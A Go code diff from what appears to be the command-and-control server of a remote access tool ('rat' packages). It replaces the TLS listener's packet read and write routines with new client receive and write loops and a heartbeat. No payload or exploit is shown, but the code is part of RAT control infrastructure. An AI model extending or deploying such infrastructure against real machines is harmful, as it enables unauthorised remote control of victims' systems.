@@ -2,12 +2,7 @@ package main
 
 import (
 	"crypto/tls"
-	"encoding/binary"
-	"fmt"
-	"io"
 	"rat/command/log"
-	"rat/shared"
-	"rat/shared/network"
 
 	"github.com/xtaci/smux"
 )
@@ -44,55 +39,13 @@ func (server TLSServer) Listen() error {
 			panic(err)
 		}
 
-		fmt.Println("aaccepted stream")
-
+		client.session = session
 		client.stream = control
-		client.Reader = network.Reader{Reader: control}
-		client.Writer = network.Writer{Writer: control}
 
-		go server.ReadRoutine(client)
-		go server.WriteRoutine(client)
+		go client.recvLoop()
+		go client.writeLoop()
 		go client.Heartbeat()
-	}
-}
 
-// ReadRoutine is the routine for continuously reading packets for this client
-// Removes client on any read error, invalid packet header or deserializing error
-func (server TLSServer) ReadRoutine(c *Client) {
-	var err error
-	for {
-		h, err := c.ReadHeader()
-
-		if err != nil {
-			break
-		}
-
-		var n int32
-		err = binary.Read(c.stream, shared.ByteOrder, &n)
-		buf := make([]byte, n)
-		io.ReadFull(c.stream, buf)
-
-		packet := GetIncomingPacket(h)
-
-		packet, err = packet.Decode(buf)
-
-		if err != nil {
-			break
-		}
-
-		packet.OnReceive(c)
-	}
-
-	log.Println("remove", err.Error())
-	removeClient(c)
-}
-
-// WriteRoutine polls all packets added to the packet channel for a specific client
-// Will call Init() on each packet and write it
-func (server TLSServer) WriteRoutine(client *Client) {
-	for {
-		packet := <-client.Queue
-		packet.Init(client)
-		client.WritePacket(packet)
+		client.streamChan <- ChannelImpl{}
 	}
 }
